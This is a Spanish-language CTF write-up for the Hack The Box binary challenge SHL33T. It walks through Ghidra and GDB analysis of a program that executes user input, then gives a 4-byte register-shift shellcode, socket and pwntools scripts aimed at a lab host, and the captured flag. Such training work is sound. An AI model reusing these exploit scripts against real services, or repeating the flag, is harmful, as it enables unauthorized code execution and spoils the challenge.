
# Write-up – SHL33T (Hack The Box)

## 🧩 Introducción

El reto **SHL33T** es un desafío de **ingeniería inversa y explotación binaria básica** cuyo objetivo es manipular el valor de un registro para cumplir una condición interna del programa y obtener la flag. El ejercicio está orientado a trabajar conceptos de **arquitectura x86_64**, **shellcode**, **análisis estático** y **análisis dinámico**.

---

## 🛠️ Herramientas utilizadas

- **Ghidra** – Herramienta de ingeniería inversa para análisis estático del binario
- **GDB** – Depurador para análisis dinámico y control del flujo de ejecución
- **Python 3** – Automatización de la explotación remota
- **Linux x86_64**

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/08341969-8fda-498b-b1df-f00e4b4b6988" />

---

Running the program:
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/a5afa746-0841-4e0f-ba30-e03e61cbef61" />


## 🔍 Análisis estático con Ghidra

El binario fue cargado en **Ghidra** para analizar su lógica interna. Tras decompilar la función `main`, se observaron los siguientes puntos clave:

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/be31de6a-b5ef-4e18-bfde-bdb175e732fb" />

funcimain(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4,undefined8 param_5,
    undefined8 param_6,undefined8 param_7,undefined8 param_8)

{
  long lVar1;
  ssize_t sVar2;
  undefined8 in_RCX;
  undefined8 extraout_RDX;
  undefined8 extraout_RDX_00;
  undefined8 extraout_RDX_01;
  undefined8 extraout_RDX_02;
  undefined8 extraout_RDX_03;
  code *pcVar3;
  code *pcVar4;
  undefined8 in_R8;
  undefined8 uVar5;
  undefined8 in_R9;
  undefined8 uVar6;
  long in_FS_OFFSET;
  undefined8 extraout_XMM0_Qa;
  undefined8 uVar7;
  undefined8 extraout_XMM0_Qa_00;
  undefined8 uVar8;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  banner();
  signal(0xb,handler);
  pcVar3 = handler;
  signal(4,handler);
  uVar7 = info(extraout_XMM0_Qa,param_2,param_3,param_4,param_5,param_6,param_7,param_8,
               "These elves are playing with me again, look at this mess: ebx = 0x00001337\n",pcVar3
               ,extraout_RDX,in_RCX,in_R8,in_R9);
  uVar7 = info(uVar7,param_2,param_3,param_4,param_5,param_6,param_7,param_8,
               "It should be ebx = 0x13370000 instead!\n",pcVar3,extraout_RDX_00,in_RCX,in_R8,in_R9)
  ;
  info(uVar7,param_2,param_3,param_4,param_5,param_6,param_7,param_8,
       "Please fix it kind human! SHLeet the registers!\n\n$ ",pcVar3,extraout_RDX_01,in_RCX,in_R8,
       in_R9);
  uVar6 = 0;
  uVar5 = 0xffffffff;
  uVar7 = 0x22;
  pcVar3 = (code *)mmap((void *)0x0,0x1000,7,0x22,-1,0);
  if (pcVar3 == (code *)0xffffffffffffffff) {
    perror("mmap");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  pcVar4 = pcVar3;
  sVar2 = read(0,pcVar3,4);
  if (0 < sVar2) {
    uVar8 = (*pcVar3)();
    fail(uVar8,param_2,param_3,param_4,param_5,param_6,param_7,param_8,
         "Christmas is ruined thanks to you and these elves!\n",pcVar4,extraout_RDX_03,uVar7,uVar5,
         uVar6);
    if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
      return 0;
    }
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  fail(extraout_XMM0_Qa_00,param_2,param_3,param_4,param_5,param_6,param_7,param_8,
       "No input given!\n",pcVar4,extraout_RDX_02,uVar7,uVar5,uVar6);
                    /* WARNING: Subroutine does not return */
  exit(1);
}

on main:

- El registro **EBX** se inicializa con el valor:
  ```
  ebx = 0x1337
  ```
- Posteriormente, el programa compara dicho valor con:
  ```
  ebx == 0x13370000
  ```
- Si la comparación es correcta, el binario ejecuta:
  ```
  system("cat flag.txt")
  ```

Además, se identificó una secuencia crítica donde el programa:

- Reserva memoria con `mmap`
- Lee datos desde la entrada estándar
- Ejecuta directamente el contenido leído

Esto indica claramente una **ejecución de código controlada por el usuario**.

---

## 🧠 Análisis del reto

La diferencia entre el valor inicial y el valor esperado:

- Valor inicial: `0x00001337`
- Valor objetivo: `0x13370000`

corresponde a un **desplazamiento lógico a la izquierda de 16 bits**:

```
0x1337 << 16 = 0x13370000
```

Por tanto, la instrucción necesaria para resolver el reto es:

```
shl ebx, 16
```

---

## 🧪 Análisis dinámico con GDB

Mediante **GDB** se confirmó el flujo de ejecución del binario:

1. Inicialización del registro `EBX`
2. Reserva de memoria ejecutable con `mmap`
3. Lectura de hasta 4 bytes desde la entrada
4. Ejecución del contenido leído
5. Comparación final del valor de `EBX`

Esto confirmó la viabilidad de inyectar **shellcode mínimo** para modificar directamente el registro.

---

## 💣 Shellcode utilizado

El shellcode necesario es extremadamente simple:

```
shl ebx, 16
ret
```

Representación en bytes (x86_64):

```
C1 E3 10 C3
```

---

## 🚀 Explotación remota

Para explotar el servicio remoto, se desarrolló un script en **Python** que establece una conexión por socket, envía el shellcode y lee toda la salida del servidor hasta el cierre de la conexión.

```
import socket

s = socket.socket()
s.connect(("HOST", PUERTO))

# shellcode: shl ebx, 16 ; ret
s.send(b"\xC1\xE3\x10\xC3")

while True:
    data = s.recv(4096)
    if not data:
        break
    print(data.decode(errors="ignore"), end="")

s.close()
```

---

## 🏁 Resultado

Tras ejecutar el shellcode:

- El registro `EBX` queda con el valor `0x13370000`
- La condición interna del programa se cumple
- Se ejecuta `cat flag.txt`
- Se obtiene la flag:

```
HTB{sh1ft_2_th3_l3ft_sh1ft_2_th3_r1ght_77447a52efe4b5c0b1d022ff66bd278b}
```

---

## 📌 Conclusión

Este reto demuestra la importancia de:

- Comprender el funcionamiento de los registros
- Identificar puntos de ejecución controlada
- Utilizar herramientas de ingeniería inversa como **Ghidra**
- Aplicar operaciones a nivel de bits para resolver validaciones internas

Un desafío limpio y didáctico para reforzar conceptos fundamentales de explotación binaria.

---

## ✍️ Autor

**unax**  
Hack The Box – Binary Exploitation

Tambien he encontrado este codigo en otro writeup nose si te servira de algo:

from pwn import *

elf = context.binary = ELF('./shl33t')
#p = elf.process()
p = remote('154.57.164.70',32458)

pl = asm('''
         shl ebx, 16
         ret
         ''')

print(f'payload length: {len(pl)}')

p.sendlineafter(b'$',pl)
p.interactive()
